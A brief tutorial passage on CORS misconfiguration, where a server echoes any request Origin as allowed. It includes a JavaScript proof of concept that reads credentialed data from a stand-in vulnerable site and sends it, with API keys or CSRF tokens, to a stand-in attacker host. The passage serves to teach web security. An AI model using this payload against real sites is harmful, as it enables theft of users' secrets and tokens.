some applications take the easy route of effectively allowing access from any other domain.

One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. 

we can access apikeys or csrf tokens using this method:
```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```
